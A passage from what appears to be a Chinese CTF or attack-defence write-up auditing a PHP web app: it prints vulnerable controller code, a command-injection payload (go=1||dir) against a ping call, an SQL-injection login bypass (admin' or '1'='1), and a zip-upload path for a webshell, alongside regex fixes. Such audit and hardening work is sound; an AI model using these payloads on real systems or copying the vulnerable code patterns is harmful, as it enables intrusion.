class="hljs-string">&#x27;id&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;phonenumber&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;phonenumber&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;QQ&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;QQ&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;email&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;email&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;photo&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;reward&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;reward&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;motto&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;motto&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;age&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;sex&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sex&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;birthday&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;birthday&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;home.tpl&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location: ./index.php&quot;</span>);<br>        &#125;<br>      <br>    &#125;<br>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$username</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>            <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>            <span class="hljs-variable">$age</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;age&#x27;</span>]);<br>            <span class="hljs-variable">$sex</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;sex&#x27;</span>]);<br>            <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$this</span>-&gt;conn);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;register.tpl&quot;</span>);  <br>                <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;error.tpl&quot;</span>);     <br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into users(username,password,age,sex) values(&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$password</span>&#x27;,&#x27;<span class="hljs-subst">$age</span>&#x27;,&#x27;<span class="hljs-subst">$sex</span>&#x27;)&quot;</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>))&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;index.tpl&quot;</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;success.tpl&quot;</span>);            <br>                &#125;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;register.tpl&quot;</span>); <br>        &#125;    <br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">include_once</span> <span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&quot;/File1.php&quot;</span>;<br>            <span class="hljs-variable">$up</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">File1</span>();<br>            <span class="hljs-variable">$path</span> = <span class="hljs-variable">$up</span>-&gt;<span class="hljs-title function_ invoke__">save</span>();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$path</span>)&#123;<br>                <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;update users set photo=&#x27;&quot;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&quot;&#x27; where id=&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$this</span>-&gt;conn))&#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;photo&quot;</span>,<span class="hljs-variable">$path</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;success.tpl&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;error.tpl&quot;</span>);<br>                &#125;<br>      <br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;error.tpl&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$_SESSION</span>=<span class="hljs-keyword">array</span>();<br>        <span class="hljs-title function_ invoke__">session_destroy</span>();<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location: ./index.php&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updatepass</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>            <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;update users set password=&#x27;<span class="hljs-subst">$password</span>&#x27; where id=&#x27;&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>))&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;success.tpl&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;updatepass.tpl&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Updateinfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user_id</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>            <span class="hljs-variable">$user_name</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_name&#x27;</span>]);<br>            <span class="hljs-variable">$user_QQ</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_QQ&#x27;</span>]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_sex&#x27;</span>]==<span class="hljs-string">&#x27;女&#x27;</span>)&#123;<br>            <span class="hljs-variable">$user_sex</span>=<span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$user_sex</span>=<span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-variable">$user_age</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_age&#x27;</span>]);<br>            <span class="hljs-variable">$user_phone</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_phone&#x27;</span>]);<br>            <span class="hljs-variable">$user_email</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_email&#x27;</span>]);<br>            <span class="hljs-variable">$user_birth</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_birth&#x27;</span>]);<br>            <span class="hljs-variable">$user_reward</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_reward&#x27;</span>]);<br>            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update users set username=&#x27;<span class="hljs-subst">$user_name</span>&#x27;,QQ=&#x27;<span class="hljs-subst">$user_QQ</span>&#x27;,sex=<span class="hljs-subst">$user_sex</span>,age=<span class="hljs-subst">$user_age</span>,phonenumber=&#x27;<span class="hljs-subst">$user_phone</span>&#x27;,email=&#x27;<span class="hljs-subst">$user_email</span>&#x27;,birthday=&#x27;<span class="hljs-subst">$user_birth</span>&#x27;,reward=&#x27;<span class="hljs-subst">$user_reward</span>&#x27; where id=<span class="hljs-subst">$user_id</span>;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>))&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;success.tpl&quot;</span>);<br>                &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br><br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;error.tpl&quot;</span>);<br>            &#125;<br>            <br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wulihah</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;go&#x27;</span>];<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c <span class="hljs-subst">$host</span>&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到最后的<code>wulihah</code>方法存在命令拼接</p><p><code>?c=User&amp;a=wulihah</code></p><p>post：<code>go=1||dir</code></p><p><img src="/mdimg/gjsweb/1743780311668-5f327cc9-e821-487a-ad78-729c2395a233.png"></p><p>这里修复就写个waf，正则匹配不允许传入<code>;</code>&amp;<code>|</code>来命令拼接，可以偷用前面的正则然后加上<code>.</code>和<code>:</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wulihah</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;go&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[\w.:-]+$/&#x27;</span>, <span class="hljs-variable">$host</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Invalid host!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c <span class="hljs-subst">$host</span>&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/gjsweb/1743780900830-cb2d7c10-97c5-493d-8279-b23a21b042e3.png"></p><p>继续审</p><p>看到登录方法<code>Login()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Login</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><br>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$this</span>-&gt;conn);<br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>();<br>          <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysql_fetch_assoc</span>(<span class="hljs-variable">$result</span>);<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-variable">$username</span>;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php?c=User&amp;a=home&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;password error!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>也是裸奔，直接拼接用户名密码。密码通过<code>md5</code>来比较，这里密码注入不了万能密码。但是<code>username</code>可以注入，<code>admin&#39; or &#39;1&#39;=&#39;1</code>即可登录<code>admin</code>账户</p><p><img src="/mdimg/gjsweb/1743781366829-213a7cc3-a85b-4558-b4af-d37b92da27c9.png"></p><p>看到后台有一个zip上传的点</p><p>上传逻辑在<code>upload</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">include_once</span> <span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&quot;/File1.php&quot;</span>;<br>            <span class="hljs-variable">$up</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">File1</span>();<br>            <span class="hljs-variable">$path</span> = <span class="hljs-variable">$up</span>-&gt;<span class="hljs-title function_ invoke__">save</span>();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$path</span>)&#123;<br>                <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;update users set photo=&#x27;&quot;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&quot;&#x27; where id=&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$this</span>-&gt;conn))&#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;photo&quot;</span>,<span class="hljs-variable">$path</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;success.tpl&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;error.tpl&quot;</span>);<br>                &#125;<br>      <br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;error.tpl&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>文件处理类在<code>File1</code>类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File1</span></span>&#123;<br><br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$typelist</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$allowexten</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$path</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;not login&quot;</span>);<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;path=<span class="hljs-string">&#x27;/tmp/uploads/&#x27;</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;path))&#123;<br>                <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$this</span>-&gt;path,<span class="hljs-number">0777</span>,<span class="hljs-literal">true</span>);<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;allow=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;zip&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">include_once</span> <span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&quot;/zip.php&quot;</span>;<br>            <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$id</span>) !== <span class="hljs-number">1</span> )&#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;you are not admin&quot;</span>);<br>            &#125;<br>            <span class="hljs-variable">$upfile</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;pic&#x27;</span>];<br>            <span class="hljs-variable">$fileinfo</span>=<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$upfile</span>[<span class="hljs-string">&quot;name&quot;</span>]);<br>            <br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&quot;extension&quot;</span>]),<span class="hljs-variable">$this</span>-&gt;allow))&#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;the file suffix is not allowed&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$filepath</span> = <span class="hljs-variable language_">$this</span>-&gt;path.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;_&quot;</span>.<span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;filename&#x27;</span>].<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&quot;extension&quot;</span>]);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filepath</span>))&#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;file already exists&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$upfile</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>],  <span class="hljs-variable">$filepath</span>))&#123;<br>                <span class="hljs-variable">$z</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Unzip</span>();<br>                <span class="hljs-variable">$z</span>-&gt;<span class="hljs-title function_ invoke__">unzip</span>(<span class="hljs-variable">$filepath</span>, <span class="hljs-variable">$this</span>-&gt;path);<br>                <span class="hljs-keyword">return</span> True;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> False;<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>该类的构造方法设置了只允许上传<code>.zip</code>后缀</p><p>在<code>save</code>方法</p><p><code>$filepath = $this-&gt;path.$id.&quot;_&quot;.$fileinfo[&#39;filename&#39;].&quot;.&quot;.strtolower($fileinfo[&quot;extension&quot;]);</code>上传的文件存储的格式为<code>/tmp/uploads/id_filename.ext</code>，并且解压输出目录为<code>/tmp/uploads/</code></p><p><code>save</code>方法调用了<code>zip</code>类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Unzip</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf8&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unzip</span>(<span class="hljs-params"><span class="hljs-variable">$src_file</span>, <span class="hljs-variable">$dest_dir</span></span>)</span>&#123;<br>            <span class="hljs-variable">$unzip</span> = <span class="hljs-string">&quot;unzip -o <span class="hljs-subst">$src_file</span> -d <span class="hljs-subst">$dest_dir</span>&quot;</span>;<br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$unzip</span>);<br>        &#125;<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>单纯的解压，没有设置waf</p><p>将一句话木马压缩为zip上传</p><p><img src="/mdimg/gjsweb/1743830229207-45b97d13-2133-45fc-a46c-866ed0b6860e.png"></p><p>但是这里保存的目录为系统的<code>tmp</code>而非<code>web</code>目录，可能需要配合文件包含来利用</p><p>当然要修复的话，只要在登录的用户名那设置<code>waf</code>，无法登录<code>admin</code>就无法上传了</p><p>同样可以偷用前面过滤类名的正则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 